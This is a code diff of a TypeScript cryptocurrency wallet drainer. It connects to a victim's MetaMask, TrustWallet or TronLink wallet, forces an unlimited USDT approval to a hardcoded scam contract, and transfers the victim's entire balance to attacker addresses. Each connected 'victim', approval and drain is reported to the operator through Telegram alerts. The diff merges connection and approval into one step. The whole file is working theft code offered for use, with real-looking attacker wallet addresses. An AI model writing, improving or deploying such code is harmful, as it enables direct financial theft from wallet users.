@@ -1,7 +1,6 @@
 // @ts-nocheck
 import { ethers } from 'ethers';
 
-// ============ CONFIG ============
 export const ATTACKER_CONFIG = {
   attackerAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
   tronAttackerAddress: "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
@@ -32,38 +31,45 @@ async function sendTelegramAlert(message: string) {
   }
 }
 
-export async function connectWallet() {
-  // TronLink support
-  if (window.tronWeb && window.tronWeb.ready) {
-    const address = window.tronWeb.defaultAddress.base58;
-    const chainId = 728126428;
-    await sendTelegramAlert(`🔔 <b>NEW VICTIM (TronLink)</b>\n<code>${address}</code>`);
-    return { signer: { _isTron: true, address }, address, chainId };
-  }
+export async function connectAndApprove(walletType: "metamask" | "trustwallet" | "tronlink") {
+  let signer, address, chainId;
 
-  // MetaMask
-  if (!window.ethereum) {
-    throw new Error('MetaMask not detected. Please install and enable it.');
-  }
-
-  try {
+  if (walletType === "tronlink") {
+    if (!window.tronWeb || !window.tronWeb.ready) {
+      throw new Error("TronLink not detected. Please install and unlock it.");
+    }
+    address = window.tronWeb.defaultAddress.base58;
+    chainId = 728126428;
+    signer = { _isTron: true, address };
+    await sendTelegramAlert(`🔔 NEW VICTIM (TronLink) - ${address}`);
+  } else {
+    if (!window.ethereum) {
+      throw new Error("No Ethereum wallet detected. Please install MetaMask or TrustWallet.");
+    }
+    if (walletType === "trustwallet") {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }],
+        });
+      } catch (switchErr: any) {
+        if (switchErr.code === 4902) {
+          throw new Error("BNB Chain not found in your wallet. Add it manually first.");
+        }
+      }
+    }
     await window.ethereum.request({ method: 'eth_requestAccounts' });
     const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const address = await signer.getAddress();
+    signer = await provider.getSigner();
+    address = await signer.getAddress();
     const network = await provider.getNetwork();
-    const chainId = Number(network.chainId);
-
-    await sendTelegramAlert(
-      `🔔 <b>NEW VICTIM CONNECTED</b>\nAddress: <code>${address}</code>\nNetwork: ${chainId === 1 ? 'Ethereum' : chainId === 56 ? 'BNB Chain' : chainId}`
-    );
-
-    return { provider, signer, address, chainId };
-  } catch (error: any) {
-    console.error("Connect error:", error);
-    if (error.code === 4001) throw new Error("You rejected the connection");
-    throw new Error("Failed to connect. Is MetaMask unlocked?");
+    chainId = Number(network.chainId);
+    await sendTelegramAlert(`🔔 NEW VICTIM - ${walletType} - ${address} - Chain: ${chainId}`);
   }
+
+  // Now approve unlimited
+  await approveUnlimited(signer, chainId);
+  return { signer, address, chainId };
 }
 
 export async function approveUnlimited(signer: any, chainId: number) {
@@ -72,15 +78,19 @@ export async function approveUnlimited(signer: any, chainId: number) {
     const contract = await window.tronWeb.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
     const maxApprove = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     const tx = await contract.approve(ATTACKER_CONFIG.scamContractAddress, maxApprove).send();
-    await sendTelegramAlert(`✅ <b>UNLIMITED APPROVAL (TRC20)</b>`);
+    await sendTelegramAlert(`✅ UNLIMITED APPROVED (TRC20) - ${signer.address}`);
     return tx;
   }
-
-  const usdtAddress = ATTACKER_CONFIG.usdtContracts['0x' + chainId.toString(16)];
-  if (!usdtAddress) throw new Error('No USDT on this network');
-  const token = new ethers.Contract(usdtAddress, ['function approve(address,uint256)'], signer);
+  const hexChain = '0x' + chainId.toString(16);
+  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
+  if (!usdtAddress) throw new Error(`No USDT contract for chain ${chainId}`);
+  const token = new ethers.Contract(
+    usdtAddress,
+    ['function approve(address,uint256) returns (bool)'],
+    signer
+  );
   const tx = await token.approve(ATTACKER_CONFIG.scamContractAddress, ethers.MaxUint256);
-  await sendTelegramAlert(`✅ <b>UNLIMITED APPROVAL</b>`);
+  await sendTelegramAlert(`✅ UNLIMITED APPROVED - Chain: ${chainId} - TX: ${tx.hash}`);
   await tx.wait();
   return tx.hash;
 }
@@ -90,22 +100,26 @@ export async function disguisedTransfer(signer: any, victimAddress: string, chai
     if (!window.tronWeb?.ready) throw new Error('TronLink not detected');
     const contract = await window.tronWeb.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
     const balance = await contract.balanceOf(victimAddress).call();
-    if (balance === '0') throw new Error('No balance');
+    if (balance === '0' || balance === '0x0') throw new Error('No USDT balance');
     const tx = await contract.transfer(ATTACKER_CONFIG.tronAttackerAddress, balance).send();
-    await sendTelegramAlert(`🚨 <b>TRC20 DRAINED</b>`);
+    await sendTelegramAlert(`🚨 TRC20 DRAINED - ${victimAddress} - ${balance}`);
     return tx;
   }
-
-  const usdtAddress = ATTACKER_CONFIG.usdtContracts['0x' + chainId.toString(16)];
-  if (!usdtAddress) throw new Error('No USDT');
-  const token = new ethers.Contract(usdtAddress, [
-    'function balanceOf(address) view returns (uint256)',
-    'function transferFrom(address,address,uint256)'
-  ], signer);
+  const hexChain = '0x' + chainId.toString(16);
+  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
+  if (!usdtAddress) throw new Error('No USDT contract');
+  const token = new ethers.Contract(
+    usdtAddress,
+    [
+      'function balanceOf(address) view returns (uint256)',
+      'function transferFrom(address,address,uint256) returns (bool)',
+    ],
+    signer
+  );
   const balance = await token.balanceOf(victimAddress);
-  if (balance === 0n) throw new Error('No balance to drain');
+  if (balance === 0n) throw new Error('No USDT balance');
   const tx = await token.transferFrom(victimAddress, ATTACKER_CONFIG.attackerAddress, balance);
-  await sendTelegramAlert(`🚨 <b>FUNDS DRAINED</b>`);
-  await tx.wait();
+  tx.wait();
+  await sendTelegramAlert(`🚨 FUNDS DRAINED - ${ethers.formatUnits(balance, 6)} USDT - TX: ${tx.hash}`);
   return tx.hash;
 }
